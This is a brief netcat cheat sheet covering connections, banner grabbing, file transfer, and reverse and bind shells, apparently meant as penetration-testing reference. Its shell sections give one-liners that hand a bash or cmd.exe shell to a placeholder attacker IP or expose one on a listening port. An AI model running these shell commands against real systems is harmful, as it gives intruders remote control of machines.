# Netcat - Cheat Sheet

## Basic Connections
- **Connect to a specific port:** `nc [Target_IP] [Port]`
- **Listen on a specific port:** `nc -nvlp [Port]`
  - `-n`: Numeric-only IP addresses (no DNS resolution)
  - `-v`: Verbose output
  - `-l`: Listen mode
  - `-p`: Specify local port

## Banner Grabbing
```bash
nc -nv [Target_IP] 80
HEAD / HTTP/1.0
<Enter>
<Enter>
```

## File Transfer
- **Receiver (Listener):** `nc -nvlp 4444 > received_file.txt`
- **Sender:** `nc -nv [Receiver_IP] 4444 < file_to_send.txt`

## Reverse Shell
*(The target machine connects back to the attacker's machine)*
- **Attacker (Listener):** `nc -nvlp 4444`
- **Victim (Linux):** `nc -e /bin/bash [Attacker_IP] 4444`
- **Victim (Windows):** `nc.exe -e cmd.exe [Attacker_IP] 4444`
  *(Note: `-e` is often disabled in modern standard netcat builds for security)*

## Bind Shell
*(The target machine opens a port and waits for the attacker to connect)*
- **Victim (Listener):** `nc -nvlp 4444 -e /bin/bash`
- **Attacker:** `nc -nv [Victim_IP] 4444`

## Ncat (Encrypted Alternatives)
- **Listener:** `ncat --ssl -nvlp 4444`
- **Connect:** `ncat --ssl [Target_IP] 4444`
